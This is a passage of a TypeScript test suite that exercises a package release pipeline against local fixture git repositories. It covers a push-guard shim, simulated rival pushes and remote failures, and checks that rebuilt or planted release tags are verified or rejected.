/**
 * The release pipeline against local fixture repositories (a bare origin plus clones playing the CI checkouts), so the tag topology is a unit test
 * rather than what the first real release discovers.
 */

import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from "bun:test";
import { execFileSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  advanceBuild,
  anchorCheck,
  anchorReleasePr,
  boundaryCheck,
  nextPublishVerdict,
  npmVerdict,
  type Packument,
  type PublishVerdict,
  packageRelease,
  prereleaseVersion,
  prereleaseVersionOf,
  retagMajor,
  stablePublishVerdict,
  verifyPublishedRefs,
  versionOrder,
} from "../../.github/scripts/release-pipeline.js";

// Dozens of git spawns per test time out bun's 5s default under parallel machine load.
setDefaultTimeout(30_000);

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
}

/** Resolved to its physical path: the shim compares against `pwd -P`. */
const FIXTURE_AREA = realpathSync(tmpdir());
const FIXTURE_PREFIX = "release-pipeline-";
const PLANS_ENV = "RELEASE_PIPELINE_PUSH_PLANS";

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) {
    rmSync(root, { recursive: true, force: true });
  }
});

/** The shim's refusal, as it prints it. */
function guardRefusal(cwd: string): string {
  return `release-pipeline fixture guard: refusing git push from ${cwd}, which is not inside ${FIXTURE_AREA}/${FIXTURE_PREFIX}*/`;
}

/** The git shim first on PATH refuses a push outside the fixture area, so no test can reach a real remote. */
let shimDir = "";
/** PATH as it was before the shim went first; undefined until it did. */
let realPath: string | undefined;
/** The real git, for a scripted rival that must not be logged as one of the pipeline's pushes. */
let realGit = "";
beforeAll(() => {
  realGit = Bun.which("git") ?? "";
  if (realGit === "") {
    throw new Error("no git on PATH");
  }
  shimDir = mkdtempSync(join(tmpdir(), "release-pipeline-shim-"));
  const script = [
    "#!/bin/sh",
    `if [ "$1" != "push" ]; then exec "${realGit}" "$@"; fi`,
    'here="$(pwd -P)"',
    'case "$here/" in',
    `  "${FIXTURE_AREA}"/${FIXTURE_PREFIX}*/*) ;;`,
    `  *) echo "release-pipeline fixture guard: refusing git push from $here, which is not inside ${FIXTURE_AREA}/${FIXTURE_PREFIX}*/" >&2; exit 1 ;;`,
    "esac",
    `plans="$${PLANS_ENV}"`,
    'if [ -n "$plans" ]; then',
    `  printf '%s\\n' "$*" >> "$plans/pushes.log"`,
    `  n=$(wc -l < "$plans/pushes.log" | tr -d ' ')`,
    '  plan="$plans/$n"',
    '  if [ -f "$plan" ]; then',
    '    read -r kind a b c < "$plan"',
    '    case "$kind" in',
    `      competitor) "${realGit}" -C "$a" push --quiet --force origin "$b:$c" ;;`,
    '      fail) cat "$plan.stderr" >&2; exit "$a" ;;',
    '      script) sh "$plan.sh" ;;',
    "    esac",
    "  fi",
    "fi",
    `exec "${realGit}" "$@"`,
    "",
  ].join("\n");
  writeFileSync(join(shimDir, "git"), script, { mode: 0o755 });
  realPath = process.env.PATH ?? "";
  process.env.PATH = `${shimDir}:${realPath}`;
});
// Undo only what beforeAll got to, so a setup failure surfaces as itself.
afterAll(() => {
  if (realPath !== undefined) {
    process.env.PATH = realPath;
  }
  if (shimDir !== "") {
    rmSync(shimDir, { recursive: true, force: true });
  }
});

/** Hermetic clone: the developer's global gitconfig (identity, signing, hooks) must not leak into the fixtures. */
function clone(root: string, originDir: string, name: string): string {
  const dir = join(root, name);
  execFileSync("git", ["clone", "--quiet", originDir, dir]);
  git(dir, "config", "user.name", "fixture");
  git(dir, "config", "user.email", "fixture@example.invalid");
  git(dir, "config", "commit.gpgsign", "false");
  git(dir, "config", "tag.gpgSign", "false");
  git(dir, "config", "core.hooksPath", join(root, "no-hooks"));
  return dir;
}

function write(cwd: string, file: string, content: string): void {
  mkdirSync(dirname(join(cwd, file)), { recursive: true });
  writeFileSync(join(cwd, file), content);
}

function commitAll(cwd: string, subject: string): string {
  git(cwd, "add", "-A");
  git(cwd, "commit", "--quiet", "-m", subject);
  return git(cwd, "rev-parse", "HEAD");
}

/** The files a build of `bundle` leaves in a checkout: the action bundle and
 * the library build (its module and its declarations), all gitignored on main. */
function builtFiles(bundle: string): Record<string, string> {
  return {
    "lib/index.js": bundle,
    "lib/pkg/index.js": `library-${bundle}`,
    "lib/pkg/index.d.ts": `types-${bundle}`,
  };
}

function writeBuild(cwd: string, bundle: string): void {
  for (const [file, content] of Object.entries(builtFiles(bundle))) {
    write(cwd, file, content);
  }
}

/** Stage the build outputs into a clone's index as the pipeline does (-f: they are gitignored). */
function stageBuild(cwd: string): void {
  git(cwd, "add", "-f", "--", "lib/index.js", "lib/pkg");
}

/** The fixture's package.json as the real one is shaped: a prepare script beside another script. */
function manifestJson(version: string, scripts: Record<string, string> = FIXTURE_SCRIPTS): string {
  return `${JSON.stringify({ name: "@scope/pkg", version, scripts }, null, 2)}\n`;
}
const FIXTURE_SCRIPTS = { prepare: "lefthook install || true", build: "bun run build:lib" };

/** What a chain commit's package.json looks like: the pipeline strips the prepare script when it mints one. */
function stripPrepare(cwd: string): void {
  const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8")) as {
    scripts?: Record<string, string>;
  };
  delete pkg.scripts?.prepare;
  write(cwd, "package.json", `${JSON.stringify(pkg, null, 2)}\n`);
  git(cwd, "add", "package.json");
}

/** What every packaged tree lacks, so a planted chain commit deviates from the pipeline's only where the test means it to. */
function stripWorkflows(cwd: string): void {
  git(cwd, "rm", "-r", "-q", "-f", "--cached", "--ignore-unmatch", "--", ".github/workflows");
}

function treePaths(cwd: string, sha: string): string[] {
  return git(cwd, "ls-tree", "-r", "--name-only", sha).split("\n");
}

/** The paths a chain commit's diff against its source lists: the workflow removal and the build outputs. */
const PACKAGED_DIFF =
  ".github/workflows/ci.yml\nlib/index.js\nlib/pkg/index.d.ts\nlib/pkg/index.js\npackage.json";

const CHANGELOG_21 = `# Changelog

## [2.1.0](https://example.invalid/compare/v2.0.0...v2.1.0) (2026-08-14)

### Features

* single-tag scheme ([abc1234](https://example.invalid/commit/abc1234))

## [2.0.0](https://example.invalid/compare/v1.0.1...v2.0.0) (2026-08-11)

### Bug Fixes

* older fix ([def5678](https://example.invalid/commit/def5678))

## 1.0.0 (2026-07-22)

### Features

* first release ([0123abc](https://example.invalid/commit/0123abc))
`;

interface Fixture {
  root: string;
  origin: string;
  work: string;
  seedSha: string;
  mergeSha: string;
}

/**
 * origin/main at the 2.0.0 release (seed) plus the squash-merged 2.1.0 release PR, with the bundle freshly "built" in the work clone: the state the
 * packaging job sees.
 */
function seedFixture(): Fixture {
  const root = mkdtempSync(join(tmpdir(), FIXTURE_PREFIX));
  roots.push(root);
  mkdirSync(join(root, "no-hooks"));
  const origin = join(root, "origin.git");
  execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin]);
  const work = clone(root, origin, "work");
  write(work, ".gitignore", "lib/index.js\nlib/pkg/\n");
  write(work, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.0.0" }, null, 2)}\n`);
  write(
    work,
    "release-please-config.json",
    `${JSON.stringify(
      {
        "last-release-sha": "0000000000000000000000000000000000000000",
        packages: { ".": { "release-type": "simple", draft: true } },
      },
      null,
      2,
    )}\n`,
  );
  write(work, "CHANGELOG.md", CHANGELOG_21.replace(/## \[2\.1\.0\][\s\S]*?\n\n## /, "## "));
  // A workflow (which no chain commit may carry) beside another .github file (which every chain commit keeps).
  write(work, ".github/workflows/ci.yml", "name: ci\non: push\njobs: {}\n");
  write(work, ".github/dependabot.yml", "version: 2\nupdates: []\n");
  write(work, "src/marker.ts", "export const marker = 1;\n");
  write(work, "package.json", manifestJson("2.0.0"));
  const seedSha = commitAll(work, "chore: seed the fixture at the 2.0.0 release");
  write(work, ".release-please-manifest.json", `${JSON.stringify({ ".": "2.1.0" }, null, 2)}\n`);
  write(work, "CHANGELOG.md", CHANGELOG_21);
  write(work, "package.json", manifestJson("2.1.0"));
  const mergeSha = commitAll(work, "chore(main): release 2.1.0 (#42)");
  git(work, "push", "--quiet", "origin", "HEAD:refs/heads/main");
  writeBuild(work, "packaged-bundle-bytes-1\n");
  return { root, origin, work, seedSha, mergeSha };
}

function checkoutOf(fx: Fixture, name: string, sha: string, bundle: string): string {
  const dir = clone(fx.root, fx.origin, name);
  git(dir, "checkout", "--quiet", sha);
  writeBuild(dir, bundle);
  return dir;
}

/** A later green push to main as CI sees it: a fresh clone at the new head with the bundle "built" from it. */
function pushGreenCommit(fx: Fixture, name: string, bundle: string): { dir: string; sha: string } {
  const dir = clone(fx.root, fx.origin, name);
  write(dir, "src/marker.ts", `export const marker = "${name}";\n`);
  const sha = commitAll(dir, `feat: ${name}`);
  git(dir, "push", "--quiet", "origin", "HEAD:refs/heads/main");
  writeBuild(dir, bundle);
  return { dir, sha };
}

/** The Source trailer as git parses it, proving the value sits in a real trailer block rather than somewhere in the body. */
function sourceTrailer(cwd: string, sha: string): string {
  return git(cwd, "log", "-1", "--format=%(trailers:key=Source,valueonly)", sha);
}

/**
 * The verify job's checkout: depth 1 at main's head after main moved past the merge commit, so only the confirmation's own fetch can supply the merge
 * commit's tree.
 */
function shallowChecker(fx: Fixture, name: string): string {
  pushGreenCommit(fx, `${name}-after-release`, "packaged-bundle-bytes-9\n");
  const checker = join(fx.root, name);
  execFileSync("git", ["clone", "--quiet", "--depth", "1", `file://${fx.origin}`, checker]);
  let known = true;
  try {
    execFileSync("git", ["rev-parse", "--verify", "--quiet", `${fx.mergeSha}^{commit}`], {
      cwd: checker,
      stdio: "ignore",
    });
  } catch {
    known = false;
  }
  expect(known).toBe(false);
  return checker;
}

const buildTip = (fx: Fixture): string => git(fx.origin, "rev-parse", "refs/heads/build");
/** Author and committer of a commit, as the pipeline must stamp its own. */
const identityOf = (cwd: string, sha: string): string =>
  git(cwd, "log", "-1", "--format=%an <%ae> / %cn <%ce>", sha);
const BOT = "settings-as-code-release <settings-as-code-release@users.noreply.github.com>";
const BOT_IDENTITY = `${BOT} / ${BOT}`;
/** The identity a clone's own config carries after the pipeline ran in it: clone() set it, and it must stay
 * (a repo config the pipeline wrote would outlive the run and stamp every later commit from that checkout). */
const localIdentity = (cwd: string): string =>
  `${git(cwd, "config", "--local", "--get", "user.name")} <${git(cwd, "config", "--local", "--get", "user.email")}>`;
const FIXTURE_IDENTITY = "fixture <fixture@example.invalid>";
/** A commit's first parent as its object records it, whatever ref or shallow state the reading clone is in. */
const parentOf = (cwd: string, sha: string): string =>
  git(cwd, "cat-file", "-p", sha).match(/^parent ([0-9a-f]{40})$/m)?.[1] ?? "";
const latestTag = (fx: Fixture): string => git(fx.origin, "rev-parse", "refs/tags/latest^{}");
const remoteRef = (fx: Fixture, ref: string): string => git(fx.work, "ls-remote", "origin", ref);

/** A chain-shaped commit minted by another writer, not pushed; the clone holding it is returned for a competitor plan to push from. */
function rivalChainCommit(
  fx: Fixture,
  name: string,
  source: string,
  parent: string | null,
  bundle: string,
): { from: string; sha: string } {
  const from = clone(fx.root, fx.origin, name);
  git(from, "checkout", "--quiet", source);
  stripWorkflows(from);
  writeBuild(from, bundle);
  stageBuild(from);
  stripPrepare(from);
  const tree = git(from, "write-tree");
  const sha = git(
    from,
    "commit-tree",
    tree,
    ...(parent === null ? [] : ["-p", parent]),
    "-m",
    "build: by another run",
    "-m",
    `Source: ${source}`,
  );
  return { from, sha };
}

/** What the shim does to the pipeline's n-th push, before real git sees it. */
type PushPlan =
  /** Force-push `sha` to `ref` first from the clone `from`; real git then judges the pipeline's push. */
  | { competitor: { from: string; sha: string; ref: string } }
  /** Run this shell first (a rival whose commit depends on origin's state at that moment). */
  | { script: string }
  /** Replay a remote a file:// origin cannot play: this stderr, this exit status. */
  | { fail: { stderr: string; status: number } };

function withPushPlans(fx: Fixture, plans: (PushPlan | null)[], body: () => void): string[][] {
  const plansDir = mkdtempSync(join(fx.root, "push-plans-"));
  for (const [index, plan] of plans.entries()) {
    if (plan === null) {
      continue;
    }
    const file = join(plansDir, String(index + 1));
    if ("competitor" in plan) {
      const { from, sha, ref } = plan.competitor;
      writeFileSync(file, `competitor ${from} ${sha} ${ref}\n`);
    } else if ("script" in plan) {
      writeFileSync(file, "script\n");
      writeFileSync(`${file}.sh`, plan.script);
    } else {
      writeFileSync(file, `fail ${plan.fail.status}\n`);
      writeFileSync(`${file}.stderr`, plan.fail.stderr);
    }
  }
  const before = process.env[PLANS_ENV];
  process.env[PLANS_ENV] = plansDir;
  try {
    body();
  } finally {
    if (before === undefined) {
      delete process.env[PLANS_ENV];
    } else {
      process.env[PLANS_ENV] = before;
    }
  }
  // No log means no push was attempted; any other trouble reading it must surface, or a no-push assertion could not tell the two apart.
  const log = join(plansDir, "pushes.log");
  if (!existsSync(log)) {
    return [];
  }
  return readFileSync(log, "utf8")
    .split("\n")
    .filter((line) => line !== "")
    .map((line) => line.split(" "));
}

const appendOf = (sha: string): string[] => ["push", "origin", `${sha}:refs/heads/build`];
const latestOf = (observed: string, tip: string): string[] => [
  "push",
  `--force-with-lease=refs/tags/latest:${observed}`,
  "origin",
  `${tip}:refs/tags/latest`,
];
const majorOf = (observed: string): string[] => [
  "push",
  `--force-with-lease=refs/tags/v2:${observed}`,
  "origin",
  "refs/tags/v2",
];
const TAG_PUSH = ["push", "origin", "refs/tags/v2.1.0"];
const ANCHOR_PUSH = ["push", "origin", "HEAD:refs/heads/release-please--branches--main"];
/** The commit a logged append carried (its objects exist in the pushing clone). */
const appendedSha = (push: string[]): string =>
  push.join(" ").replace(/^push origin (\w+):refs\/heads\/build$/, "$1");

/** Remotes a file:// origin cannot play, as git words them; none is a retry's to win. */
const PERMANENT: [string, string][] = [
  [
    "a token without write access",
    "remote: Write access to repository not granted.\nfatal: unable to access 'https://github.com/o/r/': The requested URL returned error: 403\n",
  ],
  [
    "a ruleset declining the ref",
    "remote: error: GH013: Repository rule violations found for refs/heads/build.\nremote:\n" +
      "remote: - Cannot update this protected ref.\nremote:\nTo https://github.com/o/r.git\n" +
      " ! [remote rejected] 0123abc -> build (push declined due to repository rule violations)\n" +
      "error: failed to push some refs to 'https://github.com/o/r.git'\n",
  ],
  [
    "a hook quoting git's compare-and-set words on its own line",
    "remote: pre-receive hook declined: cannot lock ref 'refs/heads/build': reference already exists\n" +
      "To https://github.com/o/r.git\n ! [remote rejected] 0123abc -> build (pre-receive hook declined)\n" +
      "error: failed to push some refs to 'https://github.com/o/r.git'\n",
  ],
];

describe("the fixture push guard", () => {
  test("a push from outside the fixture area is refused before git runs (negative control)", () => {
    const outside = mkdtempSync(join(tmpdir(), "not-a-release-pipeline-fixture-"));
    roots.push(outside);
    const origin = join(outside, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin]);
    const repo = join(outside, "repo");
    execFileSync("git", ["clone", "--quiet", origin, repo]);
    git(repo, "config", "user.name", "fixture");
    git(repo, "config", "user.email", "fixture@example.invalid");
    git(repo, "config", "commit.gpgsign", "false");
    git(repo, "commit", "--quiet", "--allow-empty", "-m", "must never land");
    let error: unknown;
    try {
      execFileSync("git", ["push", "origin", "HEAD:refs/heads/main"], {
        cwd: repo,
        encoding: "utf8",
        stdio: ["ignore", "pipe", "pipe"],
      });
    } catch (thrown) {
      error = thrown;
    }
    expect((error as { status?: number }).status).toBe(1);
    expect(String((error as { stderr?: string }).stderr).trim()).toBe(
      guardRefusal(realpathSync(repo)),
    );
    expect(git(repo, "ls-remote", "origin", "refs/heads/main")).toBe("");
  });

  test("a push from inside a fixture lands (positive control)", () => {
    const fx = seedFixture();
    git(fx.work, "push", "--quiet", "origin", `${fx.seedSha}:refs/heads/control`);
    expect(git(fx.origin, "rev-parse", "refs/heads/control")).toBe(fx.seedSha);
  });
});

describe("packageRelease", () => {
  test("a fresh release with no build branch appends its chain commit, tags it, and a rerun verifies it", () => {
    const fx = seedFixture();
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({
        cwd: fx.work,
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
        runUrl: "https://example.invalid/actions/runs/1",
      });
    });
    const packaged = git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}");
    expect(result).toEqual({ created: true, packagedSha: packaged, latestSha: packaged });
    expect(pushes).toEqual([appendOf(packaged), TAG_PUSH, latestOf("", packaged)]);
    // The chain's first commit is a root: a child of the source would record the workflow files' deletion, a workflow change the default token may
    // not push.
    expect(buildTip(fx)).toBe(packaged);
    expect(latestTag(fx)).toBe(packaged);
    retagMajor({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    expect(git(fx.origin, "rev-parse", "refs/tags/v2^{}")).toBe(packaged);
    expect(parentOf(fx.origin, packaged)).toBe("");
    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, packaged)).toBe(PACKAGED_DIFF);
    expect(treePaths(fx.origin, packaged)).toEqual([
      ".github/dependabot.yml",
      ".gitignore",
      ".release-please-manifest.json",
      "CHANGELOG.md",
      "lib/index.js",
      "lib/pkg/index.d.ts",
      "lib/pkg/index.js",
      "package.json",
      "release-please-config.json",
      "src/marker.ts",
    ]);
    expect(git(fx.origin, "show", `${packaged}:lib/index.js`)).toBe("packaged-bundle-bytes-1");
    expect(git(fx.origin, "show", `${packaged}:lib/pkg/index.js`)).toBe(
      "library-packaged-bundle-bytes-1",
    );
    const body = git(fx.origin, "log", "-1", "--format=%B", packaged);
    expect(body).toContain(`build: main at ${git(fx.origin, "rev-parse", "--short", fx.mergeSha)}`);
    expect(body).toContain("Workflow-run: https://example.invalid/actions/runs/1");
    expect(sourceTrailer(fx.origin, packaged)).toBe(fx.mergeSha);

    const rerun = checkoutOf(fx, "rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let verified: ReturnType<typeof packageRelease> | undefined;
    const rerunPushes = withPushPlans(fx, [], () => {
      verified = packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    expect(verified).toEqual({ created: false, packagedSha: packaged, latestSha: packaged });
    expect(rerunPushes).toEqual([]);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(packaged);
    expect(buildTip(fx)).toBe(packaged);
  });

  test("a release whose chain commit post-green already appended is tagged there, with no second append", () => {
    const fx = seedFixture();
    const chain = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    const release = checkoutOf(fx, "release", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: release, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    // latest already sits where post-green put it, so no lease push.
    expect(result).toEqual({ created: true, packagedSha: chain, latestSha: chain });
    expect(pushes).toEqual([TAG_PUSH]);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(chain);
    expect(buildTip(fx)).toBe(chain);
  });

  test("a release whose chain commit lies behind newer green commits is found on the chain", () => {
    const fx = seedFixture();
    const chain = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    const tip = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
    const release = checkoutOf(fx, "release", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: release, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    expect(result).toEqual({ created: true, packagedSha: chain, latestSha: tip });
    expect(pushes).toEqual([TAG_PUSH]);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(chain);
    expect(buildTip(fx)).toBe(tip);
    expect(latestTag(fx)).toBe(tip);
  });

  test("a first release whose latest move failed is healed by its rerun", () => {
    const fx = seedFixture();
    const stderr = PERMANENT[0]?.[1] ?? "";
    let error: unknown;
    const pushes = withPushPlans(fx, [null, null, { fail: { stderr, status: 128 } }], () => {
      try {
        packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      } catch (thrown) {
        error = thrown;
      }
    });
    const packaged = git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}");
    expect(pushes).toEqual([appendOf(packaged), TAG_PUSH, latestOf("", packaged)]);
    expect(error).toEqual(
      new Error(
        `git push --force-with-lease=refs/tags/latest: origin ${packaged}:refs/tags/latest failed: ${stderr.trim()}`,
      ),
    );
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
    const rerun = checkoutOf(fx, "rerun-heal", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const rerunPushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    expect(result).toEqual({ created: false, packagedSha: packaged, latestSha: packaged });
    expect(rerunPushes).toEqual([latestOf("", packaged)]);
    expect(latestTag(fx)).toBe(packaged);
  });

  test("a rerun of a release whose chain commit is followed by a backfill of an older source judges the backfill on main's full history", () => {
    const fx = seedFixture();
    // main: seed -> merge -> next. build: P(merge) with the tag, Q(next), then
    // a backfill of the SEED after them; latest at Q.
    const packaged = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
    const backfill = rivalChainCommit(
      fx,
      "seed-backfill",
      fx.seedSha,
      newer,
      "packaged-bundle-bytes-0\n",
    );
    git(backfill.from, "push", "--quiet", "origin", `${backfill.sha}:refs/heads/build`);
    // The rerun's checkout is a full clone at the merge commit; fetching the tag must not cut the seed out of main's history, or the backfill would
    // read as off main.
    const rerun = checkoutOf(fx, "rerun-backfilled", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    expect(result).toEqual({ created: false, packagedSha: packaged.packagedSha, latestSha: newer });
    expect(pushes).toEqual([]);
    expect(latestTag(fx)).toBe(newer);
    // No fetch along the way may have cut the chain's parent links: a shallow marker on a chain commit would read the release as off build.
    expect(retagMajor({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha })).toEqual({
      major: "v2",
      packagedSha: packaged.packagedSha,
    });
    expect(verifyPublishedRefs({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha })).toEqual({
      major: "v2",
      packagedSha: packaged.packagedSha,
    });
  });

  test("a release whose source is older than what latest names appends without moving latest", () => {
    const fx = seedFixture();
    // post-green skipped the merge commit; the next green commit was published.
    const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
    const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
    const release = checkoutOf(fx, "release", fx.mergeSha, "packaged-bundle-bytes-1\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(fx, [], () => {
      result = packageRelease({ cwd: release, tag: "v2.1.0", sourceSha: fx.mergeSha });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ created: true, packagedSha: tip, latestSha: newer });
    expect(pushes).toEqual([appendOf(tip), TAG_PUSH]);
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(newer);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(tip);
    expect(latestTag(fx)).toBe(newer);
  });

  test("an append overtaken by a rival packaging the same source tags the rival's commit", () => {
    const fx = seedFixture();
    const rival = rivalChainCommit(
      fx,
      "rival-same",
      fx.mergeSha,
      null,
      "packaged-bundle-bytes-1\n",
    );
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(
      fx,
      [{ competitor: { from: rival.from, sha: rival.sha, ref: "refs/heads/build" } }],
      () => {
        result = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      },
    );
    expect(result).toEqual({ created: true, packagedSha: rival.sha, latestSha: rival.sha });
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), TAG_PUSH, latestOf("", rival.sha)]);
    expect(parentOf(fx.work, rejected)).toBe("");
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(rival.sha);
    expect(buildTip(fx)).toBe(rival.sha);
  });

  test("an append overtaken by a rival packaging another source is retried after it", () => {
    const fx = seedFixture();
    const rival = rivalChainCommit(fx, "rival-other", fx.seedSha, null, "competitor-bundle\n");
    let result: ReturnType<typeof packageRelease> | undefined;
    const pushes = withPushPlans(
      fx,
      [{ competitor: { from: rival.from, sha: rival.sha, ref: "refs/heads/build" } }],
      () => {
        result = packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
      },
    );
    const tip = buildTip(fx);
    expect(result).toEqual({ created: true, packagedSha: tip, latestSha: tip });
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), appendOf(tip), TAG_PUSH, latestOf("", tip)]);
    expect(parentOf(fx.work, rejected)).toBe("");
    expect(git(fx.origin, "rev-parse", `${tip}^`)).toBe(rival.sha);
    expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(tip);
  });

  /** What a rerun's rebuild can get wrong under the packaged paths, and how the verification names it. */
  const drifted: [string, (rerun: string) => void, RegExp][] = [
    [
      "the action bundle's bytes",
      (rerun) => write(rerun, "lib/index.js", "DIFFERENT-bytes\n"),
      /refs\/tags\/v2\.1\.0 carries a lib\/index\.js that is not a build of [0-9a-f]{40}'s source/,
    ],
    [
      "the library declarations' bytes",
      (rerun) => write(rerun, "lib/pkg/index.d.ts", "DIFFERENT-types\n"),
      /refs\/tags\/v2\.1\.0 carries a lib\/pkg\/index\.d\.ts that is not a build of [0-9a-f]{40}'s source/,
    ],
    [
      "an extra library file",
      (rerun) => write(rerun, "lib/pkg/chunk.js", "extra\n"),
      /refs\/tags\/v2\.1\.0 carries \[lib\/index\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\] under lib\/index\.js and lib\/pkg\/, while this build of [0-9a-f]{40} produced \[lib\/index\.js, lib\/pkg\/chunk\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\]/,
    ],
  ];
  test.each(drifted)("a rerun whose rebuild differs in %s stops loudly", (_name, drift, error) => {
    const fx = seedFixture();
    packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha });
    const before = git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}");
    const rerun = checkoutOf(fx, "rerun-drift", fx.mergeSha, "packaged-bundle-bytes-1\n");
    drift(rerun);
    expect(() => packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      error,
    );
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(before);
  });

  /** Plant v2.1.0 (and, when asked, v2) on a commit of `files` over `from` under `message`. */
  function plantTag(
    fx: Fixture,
    name: string,
    from: string,
    message: string[],
    files: Record<string, string>,
    tags: string[] = ["v2.1.0"],
    workflows: "stripped" | "kept" = "stripped",
  ): string {
    const planter = clone(fx.root, fx.origin, name);
    git(planter, "checkout", "--quiet", from);
    if (workflows === "stripped") {
      stripWorkflows(planter);
    }
    for (const [file, content] of Object.entries(files)) {
      write(planter, file, content);
      git(planter, "add", "-f", file);
    }
    git(planter, "commit", "--quiet", "--allow-empty", ...message.flatMap((m) => ["-m", m]));
    for (const tag of tags) {
      git(planter, "tag", tag);
    }
    git(planter, "push", "--quiet", "origin", ...tags.map((tag) => `refs/tags/${tag}`));
    return git(planter, "rev-parse", "HEAD");
  }

  const wrongSource: [string, (fx: Fixture) => string[], RegExp][] = [
    [
      "recording another source",
      (fx) => ["build: by hand", `Source: ${fx.seedSha}`],
      /records [0-9a-f]{40} as its source, not this release's merge commit/,
    ],
    [
      "recording no source",
      () => ["build: package v2.1.0"],
      /records no source, not this release's merge commit/,
    ],
  ];
  test.each(wrongSource)("an existing tag %s stops loudly", (_name, message, error) => {
    const fx = seedFixture();
    const planted = plantTag(fx, "planter", fx.seedSha, message(fx), builtFiles("planted\n"));
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      error,
    );
    expect(git(fx.origin, "rev-parse", "refs/tags/v2.1.0^{}")).toBe(planted);
    expect(remoteRef(fx, "refs/heads/build")).toBe("");
  });

  test("an existing tag that changes more than the build outputs stops loudly", () => {
    const fx = seedFixture();
    plantTag(fx, "planter-extra", fx.mergeSha, ["build: by hand", `Source: ${fx.mergeSha}`], {
      ...builtFiles("packaged-bundle-bytes-1\n"),
      "src/marker.ts": "export const marker = 666;\n",
    });
    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*src\/marker\.ts/,
    );
  });

  test("an existing tag that kept its workflows stops loudly, naming them", () => {
    const fx = seedFixture();
    plantTag(
      fx,
      "planter-workflows",
      fx.mergeSha,
      ["build: by hand", `Source: ${fx.mergeSha}`],
      builtFiles("packaged-bundle-bytes-1\n"),
      ["v2.1.0"],
      "kept",
    );
